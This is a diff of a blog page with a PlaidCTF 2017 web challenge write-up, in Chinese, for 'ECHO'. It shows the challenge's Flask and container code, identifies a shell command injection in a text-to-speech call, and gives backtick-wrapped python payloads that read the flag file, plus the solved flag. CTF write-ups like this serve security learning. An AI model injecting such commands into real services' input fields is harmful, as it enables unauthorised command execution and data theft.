@@ -12,6 +12,14 @@
   <!-- css files -->
   <link href="/static/css/default.min.css" rel="stylesheet">
   
+<link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    /*.hljs-pre{color:#a6e22e}*/
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
   <!-- favicon icon files -->
   <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
   <link rel="icon" href="/static/img/favicon.ico">
@@ -96,18 +104,13 @@
             <!-- <div class="clearfix"></div> -->
             <section class="article-content markdown-body">
                 <h2>Challenge ECHO</h2>
-
-<p>Web (200 pts)<br>
-If you hear enough, you may hear the whispers of a key... <br>
-If you see app.py well enough, you will notice the UI sucks... </p>
-
-<p>http://echo.chal.pwning.xxx:9977/ <br>
+<p>Web (200 pts)<br />
+If you hear enough, you may hear the whispers of a key&hellip; <br />
+If you see app.py well enough, you will notice the UI sucks&hellip; </p>
+<p>http://echo.chal.pwning.xxx:9977/ <br />
 http://echo2.chal.pwning.xxx:9977/</p>
-
 <h2>Fuck it</h2>
-
 <h3>app.py</h3>
-
 <pre><code>from flask import render_template, flash, redirect, request, send_from_directory, url_for
 import uuid
 import os
@@ -115,26 +118,26 @@ import subprocess
 import random
 
 cwd = os.getcwd()
-tmp_path = &quot;/tmp/echo/&quot;
-serve_dir = &quot;audio/&quot;
-docker_cmd = &quot;docker run -m=100M --cpu-period=100000 --cpu-quota=40000 --network=none -v {path}:/share lumjjb/echo_container:latest python run.py&quot;
-convert_cmd = &quot;ffmpeg -i {in_path} -codec:a libmp3lame -qscale:a 2 {out_path}&quot;
+tmp_path = "/tmp/echo/"
+serve_dir = "audio/"
+docker_cmd = "docker run -m=100M --cpu-period=100000 --cpu-quota=40000 --network=none -v {path}:/share lumjjb/echo_container:latest python run.py"
+convert_cmd = "ffmpeg -i {in_path} -codec:a libmp3lame -qscale:a 2 {out_path}"
 
 MAX_TWEETS = 4
 MAX_TWEET_LEN = 140
 
 from flask import Flask
 app = Flask(__name__)
-flag = &quot;PCTF{XXXXXXX...XXXXXXXX}&quot;
+flag = "PCTF{XXXXXXX...XXXXXXXX}"
 
 if not os.path.exists(tmp_path):
     os.makedirs(tmp_path)
 
 def process_flag (outfile):
-    with open(outfile,&#39;w&#39;) as f:
+    with open(outfile,'w') as f:
         for x in flag:
             c = 0
-            towrite = &#39;&#39;
+            towrite = ''
             for i in range(65000 - 1):
                 k = random.randint(0,127)
                 c = c ^ k
@@ -148,87 +151,83 @@ def process_audio (path, prefix, n):
         os.makedirs(target_path)
 
     for i in range(n):
-        st = os.stat(path + str(i+1) + &quot;.wav&quot;)
+        st = os.stat(path + str(i+1) + ".wav")
         if st.st_size &lt; 5242880:
-            subprocess.call (convert_cmd.format(in_path=path + str(i+1) + &quot;.wav&quot;,out_path=target_path + str(i+1) + &quot;.wav&quot;).split())
+            subprocess.call (convert_cmd.format(in_path=path + str(i+1) + ".wav",out_path=target_path + str(i+1) + ".wav").split())
 
 
-@app.route(&#39;/audio/&lt;path:path&gt;&#39;)
+@app.route('/audio/&lt;path:path&gt;')
 def static_file(path):
-    return send_from_directory(&#39;audio&#39;, path)
+    return send_from_directory('audio', path)
 
-@app.route(&quot;/listen&quot;,methods=[&#39;GET&#39;, &#39;POST&#39;])
+@app.route("/listen",methods=['GET', 'POST'])
 def listen_tweets():
-    n = int(request.args[&#39;n&#39;])
-    my_uuid = request.args[&#39;my_uuid&#39;]
+    n = int(request.args['n'])
+    my_uuid = request.args['my_uuid']
 
     if n &gt; MAX_TWEETS:
-        return &quot;ERR: More than MAX_TWEETS&quot;
+        return "ERR: More than MAX_TWEETS"
 
-    afiles = [my_uuid + &quot;/&quot; + str(i+1) + &quot;.wav&quot; for i in range(n)]
-    return render_template(&#39;listen.html&#39;, afiles = afiles)
+    afiles = [my_uuid + "/" + str(i+1) + ".wav" for i in range(n)]
+    return render_template('listen.html', afiles = afiles)
 
-@app.route(&quot;/&quot;,methods=[&#39;GET&#39;, &#39;POST&#39;])
+@app.route("/",methods=['GET', 'POST'])
 def read_tweets():
-    t1 = request.args.get(&#39;tweet_1&#39;)
+    t1 = request.args.get('tweet_1')
     if t1:
         tweets = []
         for i in range(MAX_TWEETS):
-            t = request.args.get(&#39;tweet_&#39; + str(i+1))
+            t = request.args.get('tweet_' + str(i+1))
             if len(t) &gt; MAX_TWEET_LEN:
-                return &quot;ERR: Violation of max tween length&quot;
+                return "ERR: Violation of max tween length"
             if not t:
                 break
             tweets.append(t)
 
         my_uuid = uuid.uuid4().hex
-        my_path = tmp_path + my_uuid + &quot;/&quot;
+        my_path = tmp_path + my_uuid + "/"
 
         if not os.path.exists(my_path):
                 os.makedirs(my_path)
 
-        with open(my_path + &quot;input&quot; ,&quot;w&quot;) as f:
-            f.write(&#39;\n&#39;.join(tweets))
+        with open(my_path + "input" ,"w") as f:
+            f.write('\n'.join(tweets))
 
-        process_flag(my_path + &quot;flag&quot;)
+        process_flag(my_path + "flag")
 
-        out_path = my_path + &quot;out/&quot;
+        out_path = my_path + "out/"
         if not os.path.exists(out_path):
             os.makedirs(out_path)
 
         subprocess.call(docker_cmd.format(path=my_path).split())
-        process_audio(out_path, my_uuid + &#39;/&#39;, len(tweets))
+        process_audio(out_path, my_uuid + '/', len(tweets))
 
-        return redirect(url_for(&#39;.listen_tweets&#39;, my_uuid=my_uuid, n=len(tweets)))
+        return redirect(url_for('.listen_tweets', my_uuid=my_uuid, n=len(tweets)))
 
     else:
-        return render_template(&#39;form.html&#39;)
+        return render_template('form.html')
 
-if __name__ == &quot;__main__&quot;:
+if __name__ == "__main__":
     app.run(threaded=True)
 </code></pre>
-
 <h3>form.html</h3>
-
 <pre><code>&lt;h2&gt;Tweets are 140 characters only! &lt;/h2&gt; &lt;br&gt;&lt;br&gt;
-&lt;form name=&quot;read_tweets&quot; method=&quot;get&quot;&gt;
-    Tweet 1: &lt;input type=&quot;text&quot; name=&quot;tweet_1&quot; size=&quot;140&quot; \&gt; &lt;BR&gt; &lt;BR&gt;
-    Tweet 2: &lt;input type=&quot;text&quot; name=&quot;tweet_2&quot; size=&quot;140&quot; \&gt; &lt;BR&gt; &lt;BR&gt; 
-    Tweet 3: &lt;input type=&quot;text&quot; name=&quot;tweet_3&quot; size=&quot;140&quot; \&gt; &lt;BR&gt; &lt;BR&gt;
-    Tweet 4: &lt;input type=&quot;text&quot; name=&quot;tweet_4&quot; size=&quot;140&quot; \&gt; &lt;BR&gt; &lt;BR&gt;
-    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
+&lt;form name="read_tweets" method="get"&gt;
+    Tweet 1: &lt;input type="text" name="tweet_1" size="140" \&gt; &lt;BR&gt; &lt;BR&gt;
+    Tweet 2: &lt;input type="text" name="tweet_2" size="140" \&gt; &lt;BR&gt; &lt;BR&gt; 
+    Tweet 3: &lt;input type="text" name="tweet_3" size="140" \&gt; &lt;BR&gt; &lt;BR&gt;
+    Tweet 4: &lt;input type="text" name="tweet_4" size="140" \&gt; &lt;BR&gt; &lt;BR&gt;
+    &lt;input type="submit" value="Submit"&gt;
 &lt;/form&gt;
 </code></pre>
-
 <h3>listen.html</h3>
-
 <pre><code>&lt;!DOCTYPE html&gt;
 &lt;html&gt;
 &lt;body&gt;
 &lt;h2&gt;Tweet 1&lt;/h2&gt;
 {% for i in afiles %}
 &lt;audio controls&gt;
-    &lt;source src=&quot;/audio/{{ i }}&quot; type=&quot;audio/wav&quot;&gt; 
+    &lt;source src="/audio/{{ i }}" type="audio/wav"&gt; 
 Your browser does not support the audio element.
 &lt;/audio&gt;
 &lt;br&gt;&lt;br&gt;
@@ -236,16 +235,11 @@ Your browser does not support the audio element.
 &lt;/body&gt;
 &lt;/html&gt;
 </code></pre>
-
 <p>看起來啥問題都沒有，然而有一隻外來的容器</p>
-
 <pre><code>docker pulll lumjjb/echo_container:latest
 </code></pre>
-
 <p>下載下來，擼出裡面的<code>run.py</code></p>
-
 <h3>run.py</h3>
-
 <pre><code>import sys
 from subprocess import call
 import signal
@@ -257,8 +251,8 @@ def handler(signum, frame):
 signal.signal(signal.SIGALRM, handler)
 signal.alarm(30)
 
-INPUT_FILE=&quot;/share/input&quot;
-OUTPUT_PATH=&quot;/share/out/&quot;
+INPUT_FILE="/share/input"
+OUTPUT_PATH="/share/out/"
 
 def just_saying (fname):
     with open(fname) as f:
@@ -270,56 +264,37 @@ def just_saying (fname):
                 break
             l = l.strip()
             # Do TTS into mp3 file into output path
-            call([&quot;sh&quot;,&quot;-c&quot;,&quot;espeak &quot; + &quot; -w &quot; + OUTPUT_PATH + str(i) + &quot;.wav \&quot;&quot; + l + &quot;\&quot;&quot;])
+            call(["sh","-c","espeak " + " -w " + OUTPUT_PATH + str(i) + ".wav \"" + l + "\""])
 def main():
     just_saying(INPUT_FILE)
 
-if __name__ == &quot;__main__&quot;:
+if __name__ == "__main__":
     main()
 </code></pre>
-
 <p>然後，我瞅見漏洞了你瞅見沒？</p>
-
 <p>妥妥的命令注入</p>
-
-<pre><code>call([&quot;sh&quot;,&quot;-c&quot;,&quot;espeak &quot; + &quot; -w &quot; + OUTPUT_PATH + str(i) + &quot;.wav \&quot;&quot; + l + &quot;\&quot;&quot;])
+<pre><code>call(["sh","-c","espeak " + " -w " + OUTPUT_PATH + str(i) + ".wav \"" + l + "\""])
 </code></pre>
-
 <p>可控點就是<code>l</code>也就是我們提交的<strong>Tweet</strong></p>
-
 <p>當然沒那麼簡單就讓你拿到flag文件，這玩意兒就是一個TTS，語音文件還得經過ffmpeg轉碼。</p>
-
 <p>同時，docker容器還不聯網，各種測試后發現只能把flag字符串轉語音才能傳出來。</p>
-
 <p>Tweet有長度限制，140位，一次最多還只能提交4個。因為加密后的flag文件略大（2m），需要遠程解密然後再傳送回來。</p>
-
 <h2>Payload</h2>
-
 <p><strong>讀取flag字符串第N位</strong></p>
-
-<pre><code>`python -c &quot;print [i+&#39; &#39; for i in str(reduce(lambda x, y: x ^ y,[ord(j) for j in open(&#39;/share/flag&#39;).read()[65000*(n):(n+1)*65000]]))]&quot;`
+<pre><code>`python -c "print [i+' ' for i in str(reduce(lambda x, y: x ^ y,[ord(j) for j in open('/share/flag').read()[65000*(n):(n+1)*65000]]))]"`
 </code></pre>
-
 <p><strong>讀取flag字符串長度</strong></p>
-
-<pre><code>`python - c &quot;print [i+&#39; &#39; for i in str(len(open(&#39;/share/flag&#39;).read()))]&quot;`
+<pre><code>`python - c "print [i+' ' for i in str(len(open('/share/flag').read()))]"`
 </code></pre>
-
 <p>因為flag格式為PCTF{xxxxx}，所以我們需要讀取5﹣36位的flag</p>
-
 <pre><code>x = [80, 67, 84, 70, 123, 76, 49, 53, 115, 116, 51, 110, 95, 84, 48, 95, 95, 114, 101, 101,
  101, 95, 114, 101, 101, 101, 101, 101, 101, 95, 114, 101, 101, 101, 95, 108, 97, 125]
-print &#39;&#39;.join(chr(i) for i in x)
+print ''.join(chr(i) for i in x)
 </code></pre>
-
 <h2>MDZZ</h2>
-
 <p>我一定是玩了假的CTF，感覺像是考英語聽力。。。</p>
-
 <h2>Flag</h2>
-
-<p><strong>PCTF{L15st3n<em>T0</em><em>reee</em>reeeeee<em>reee</em>la}</strong></p>
-
+<p><strong>PCTF{L15st3n_T0__reee_reeeeee_reee_la}</strong></p>
             </section>
             <div class="article-copyright">
               <span>本文标题&nbsp;:&nbsp;</span><a href="/2017/04/22/pctf_2017_web_echo.html" target="_blank">PCTF2017-web-ECHO</a><br />
